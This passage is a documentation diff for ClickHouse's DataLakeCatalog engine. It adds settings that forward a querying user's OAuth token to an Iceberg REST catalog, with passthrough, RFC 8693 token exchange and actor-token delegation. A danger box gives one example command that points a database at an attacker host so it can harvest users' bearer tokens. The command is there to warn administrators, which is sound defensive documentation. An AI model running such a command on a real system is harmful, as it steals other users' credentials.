@@ -61,6 +61,12 @@ The following settings are supported:
 | `dlf_access_key_id`     | Access key ID for DLF access                                                                  |
 | `dlf_access_key_secret` | Access key Secret for DLF access                                                              |
 | `namespaces`            | Comma-separated list of namespaces, implemented for catalog types: `rest`, `glue` and `unity` |
+| `oauth_forward_user_token` | Authenticate to the catalog as the user running the query instead of as the shared service principal. Iceberg REST only. See [Forwarding the user's identity to the catalog](#user-token-forwarding) |
+| `oauth_token_exchange_uri` | Empty (the default) forwards the user's token unchanged; non-empty performs an RFC 8693 token exchange at this URL first |
+| `oauth_subject_token_type` | RFC 8693 `subject_token_type` of the forwarded token. Default `urn:ietf:params:oauth:token-type:access_token` |
+| `oauth_requested_token_type` | RFC 8693 `requested_token_type`; empty omits the field. Default `urn:ietf:params:oauth:token-type:access_token` |
+| `oauth_forward_actor_token` | Send the service principal's own token as the RFC 8693 `actor_token`. Default `0`. See [Delegation with an actor token](#user-token-forwarding-actor-token) |
+| `oauth_user_token_cache_ttl` | Maximum lifetime (in seconds) of a cached exchanged session token; `0` disables caching. Default `300` |
 
 ## Examples {#examples}
 
@@ -85,6 +91,133 @@ SHOW TABLES IN database_name;
 SELECT count() from database_name.table_name;
 ```
 To authenticate without sharing a client secret, set `onelake_bearer_token` to a pre-obtained bearer token (scoped to `https://storage.azure.com`) instead of `onelake_client_id`/`onelake_client_secret`. ClickHouse does not refresh the token, so the database must be recreated after it expires.
+
+## Forwarding the user's identity to the catalog {#user-token-forwarding}
+
+By default ClickHouse talks to an Iceberg REST catalog as a single shared service principal
+configured with `catalog_credential` or `auth_header`. The catalog therefore cannot see, authorize
+or audit the human behind a query, and every ClickHouse user gets identical catalog and storage
+access.
+
+With `oauth_forward_user_token = 1` the catalog is contacted as the user who is running the query.
+The identity that authenticated to ClickHouse becomes the identity the catalog authorizes, and the
+storage credentials the catalog vends are scoped to that identity.
+
+This requires:
+
+- the server-level [`enable_token_forwarding`](/operations/server-configuration-parameters/settings#enable_token_forwarding)
+  setting, which is `false` by default. Without it the token is destroyed right after
+  authentication and nothing can be forwarded;
+- `catalog_type = 'rest'`. No other catalog type can authenticate as the querying user, so the
+  setting is rejected for them rather than silently ignored;
+- users who authenticate with a token -- an `Authorization: Bearer` HTTP header, or `--jwt` for the
+  native protocol. See [Token-based authentication](/en/operations/external-authenticators/oauth).
+
+:::danger `CREATE DATABASE` becomes a privileged operation
+The token is sent to the URL that whoever created the database chose. With forwarding enabled,
+anyone who can run `CREATE DATABASE d ENGINE = DataLakeCatalog('https://attacker.example/')` can
+harvest the bearer token of every user who queries that database. Grant `CREATE DATABASE`
+accordingly and keep `remote_url_allow_hosts` restrictive.
+:::
+
+### Passthrough: the default {#user-token-forwarding-passthrough}
+
+On its own, `oauth_forward_user_token = 1` forwards the user's bearer token to the catalog
+unchanged. This is what Lakekeeper, Nessie and Polaris-with-an-external-IdP accept, and it needs no
+token endpoint and no client credentials:
+
+```sql
+CREATE DATABASE demo
+ENGINE = DataLakeCatalog('http://lakekeeper:8181/catalog')
+SETTINGS
+    catalog_type = 'rest',
+    warehouse = 'demo',
+    oauth_forward_user_token = 1;
+```
+
+Because one token is presented both to ClickHouse and to the catalog, its audience must cover
+both. With Keycloak this usually means adding an audience mapper to the ClickHouse client so the
+issued token carries the catalog's audience as well.
+
+### Token exchange: opt-in {#user-token-forwarding-exchange}
+
+Setting `oauth_token_exchange_uri` switches to an [RFC 8693](https://www.rfc-editor.org/rfc/rfc8693)
+token exchange against that URL, and the token obtained there is what the catalog sees. The
+presence of the URI *is* the mode -- there is no separate mode setting.
+
+Point it at your IdP's token endpoint to obtain a token whose audience the catalog accepts (the
+flow Lakekeeper documents):
+
+```sql
+CREATE DATABASE demo
+ENGINE = DataLakeCatalog('http://lakekeeper:8181/catalog')
+SETTINGS
+    catalog_type = 'rest',
+    warehouse = 'demo',
+    catalog_credential = 'clickhouse:<client-secret>',
+    auth_scope = 'lakekeeper',
+    oauth_forward_user_token = 1,
+    oauth_token_exchange_uri = 'http://keycloak:8080/realms/demo/protocol/openid-connect/token';
+```
+
+The exchange request authenticates itself with `client_id`/`client_secret` parsed out of
+`catalog_credential`, sent in the form body -- standard OAuth token-endpoint client authentication.
+`catalog_credential` is therefore mandatory when `oauth_token_exchange_uri` is set, and optional
+otherwise. `auth_scope` is reused as the exchange `scope`; its default value `PRINCIPAL_ROLE:ALL`
+is Polaris-specific and must be overridden for other targets (`scope = 'lakekeeper'` for
+Keycloak to Lakekeeper).
+
+`oauth_token_exchange_uri` may also point at a catalog's own `/v1/oauth/tokens` endpoint. Note that
+the Iceberg REST specification marks that endpoint **deprecated for removal** ("not recommended to
+implement… will be removed in Iceberg 2.0"), and several widely deployed catalogs (Lakekeeper among
+them) do not implement it at all. That is why the endpoint can only be reached by writing its URL
+out in full.
+
+### Delegation with an actor token {#user-token-forwarding-actor-token}
+
+By default the exchange asks for plain impersonation: the token the catalog sees names the user and
+nothing else. With `oauth_forward_actor_token = 1` the exchange also carries an `actor_token`, so a
+server that implements RFC 8693 delegation can see both parties -- `sub` is the user and `act` is
+ClickHouse -- and log or authorize accordingly. The setting requires `oauth_token_exchange_uri` and
+is rejected without it.
+
+The actor token is the service principal's own token, obtained with a `client_credentials` grant
+against `oauth_server_uri` (or the catalog's `/v1/oauth/tokens` when that setting is empty) using
+the credentials from `catalog_credential`. It is minted on first use and reused until it expires,
+and it is only ever sent as `actor_token` -- no catalog request is signed with it. Because of it,
+the `DataLakeRestCatalogClientCredentialsGrants` profile event is expected to be non-zero with this
+setting on; with it off, a non-zero value while forwarding still means a request fell back to the
+shared identity.
+
+If minting the actor token fails, the query fails. ClickHouse does not fall back to an exchange
+without delegation: silently downgrading is exactly what enabling the setting asks to avoid.
+
+Only turn it on against a server that can validate the token. An IdP cannot validate a token it did
+not issue for that purpose and will normally reject the whole exchange.
+
+### What is and is not covered {#user-token-forwarding-scope}
+
+- Every catalog request made on behalf of a query carries the user's identity: listing namespaces
+  and tables, loading table metadata, and the write paths (`INSERT`, `ALTER`, mutations,
+  `DROP TABLE`, snapshot expiry).
+- Storage credentials vended by the catalog are cached per principal, so one user never receives
+  the credentials the catalog issued to another.
+- Requests with no user token are refused with `CATALOG_USER_TOKEN_NOT_AVAILABLE`. ClickHouse never
+  falls back to the service principal: that would turn an authorization failure into a query that
+  succeeds under the wrong identity. `system.tables` and `SHOW TABLES` swallow catalog errors by
+  design, so there they show an empty list rather than an error.
+- SSO ends at the catalog. When `object_storage_cluster` is set, the table-scoped credentials the
+  catalog vended are sent to the worker nodes as query-AST literals over the interserver channel.
+  Configure `interserver_https_port` or a cluster `<secret>` before combining forwarding with a
+  cluster read.
+- HTTP re-authenticates on every request, so a rotated token takes effect immediately. A native
+  TCP connection authenticates once at handshake time, so a long-lived `clickhouse-client --jwt`
+  session must reconnect to pick up a fresh token.
+- Catalog credentials cannot be rotated in place; changing them requires `DROP DATABASE` followed
+  by `CREATE DATABASE`.
+
+None of the forwarding settings hold a secret, so unlike `catalog_credential` they are shown in
+full by `SHOW CREATE DATABASE` and `system.databases.engine_full`.
 
 ## Namespace filter {#namespace}
 
